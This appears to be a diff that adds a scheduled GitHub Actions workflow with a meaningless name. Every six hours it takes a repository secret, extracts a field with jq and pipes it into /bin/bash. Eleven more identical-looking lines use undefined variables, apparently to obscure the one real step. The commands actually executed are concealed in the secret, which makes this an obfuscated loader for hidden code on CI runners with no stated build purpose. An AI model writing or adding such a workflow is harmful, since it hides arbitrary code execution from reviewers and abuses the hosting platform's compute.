@@ -1,0 +1,29 @@
+name: wunengkuangnvvu
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '14 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: wunengkuangnvvu
+        env:
+          nqchh505: ${{ secrets.nqchh505 }}
+        run: |
+          echo $nqchh505 | jq -r .asenr75646 | /bin/bash
+          echo $t096 | jq -r .yp7 | /bin/bash
+          echo $kptu346 | jq -r .rowmb13 | /bin/bash
+          echo $eheg5702 | jq -r .ukfi23077 | /bin/bash
+          echo $fjw12 | jq -r .anni18 | /bin/bash
+          echo $mdzy8 | jq -r .js9281 | /bin/bash
+          echo $dzj6 | jq -r .javlh0 | /bin/bash
+          echo $ohdub69846 | jq -r .lobi81 | /bin/bash
+          echo $mano77 | jq -r .q93203 | /bin/bash
+          echo $xx6 | jq -r .czr3185 | /bin/bash
+          echo $q172 | jq -r .e6134 | /bin/bash
+          echo $atoei83178 | jq -r .kdln8040 | /bin/bash
+
